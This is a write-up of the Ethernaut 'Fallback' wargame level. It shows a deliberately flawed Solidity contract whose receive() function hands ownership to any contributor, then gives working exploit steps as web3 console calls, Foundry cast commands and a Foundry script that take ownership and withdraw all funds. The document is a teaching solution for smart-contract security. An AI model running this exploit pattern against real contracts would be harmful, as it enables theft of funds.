# **Level 01 - Fallback (Ethernaut)**

## **Overview**

This level teaches how the **fallback / receive function works**.

The contract has a wrong logic.

We can use it to become the owner.

**Objective:**

- Become the owner

- Withdraw all ETH from the contract

## **Ethernaut Info**

You know the basics of how ether goes in and out of contracts, including the usage of the fallback method.

You've also learnt about OpenZeppelin's Ownable contract, and how it can be used to restrict the usage of some methods to a privileged address.

Move on to the next level when you're ready!

## **Contract**

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

## **Vulnerability**

The problem is in the receive() function.

```
require(msg.value > 0 && contributions[msg.sender] > 0);
owner = msg.sender;
```

If:

- we send ETH

- and we already have contribution

→ we become the owner

This is a bad design.

## **Attack Strategy**

We need to:

1.  Call contribute() with small ETH

2.  Send ETH directly to contract (trigger receive)

3.  Become owner

4.  Call withdraw()

## **Exploit Steps**

### **Method 1 --- Browser Console (Web3)**

#### **1\. Contribute small ETH**

```
await contract.contribute({ value: toWei("0.0005") })
```

#### **2\. Send ETH to trigger receive**

```
await contract.sendTransaction({
  value: toWei("0.0001")
})
```

#### **3\. Check owner**

```
await contract.owner()
```

Now you are the owner.

#### **4\. Withdraw ETH**

```
await contract.withdraw()
```

### **Method 2 --- Foundry**

#### **1\. Contribute**

```
cast send $CONTRACT "contribute()" --value 0.0005ether --private-key $PRIVATE_KEY
```

#### **2\. Trigger receive**

```
cast send $CONTRACT --value 0.0001ether --private-key $PRIVATE_KEY
```

#### **3\. Check owner**

```
cast call $CONTRACT "owner()(address)"
```

#### **4\. Withdraw**

```
cast send $CONTRACT "withdraw()" --private-key $PRIVATE_KEY
```

### **Method 3 --- Foundry Script**

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {

    Fallback public fallbackInstance = Fallback(payable(0xdeB300C6e013BbCa7891962c4e78A11d41161479));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fallbackInstance.contribute{value: 1 wei}();
        address(fallbackInstance).call{value: 1 wei}("");
        console.log("New Owner: ", fallbackInstance.owner());
        console.log("Attacker: ", vm.envAddress("Attacker_Address"));
        fallbackInstance.withdraw();

        vm.stopBroadcast();
    }
}
```

## **Why This Works**

- receive() runs when we send ETH with no data

- It changes the owner

- It only checks:
  - msg.value > 0

  - we have contribution

We can easily pass both conditions

## **Key Takeaways**

- Fallback / receive functions are dangerous

- Never change ownership inside fallback

- Always check logic carefully

- Small mistakes = full contract control

## **Tools**

- Browser console (web3)

- Foundry (cast)

- RPC provider

## **Summary**

The contract allows anyone to become owner.

We:

- send small ETH

- trigger receive

- become owner

- withdraw all funds
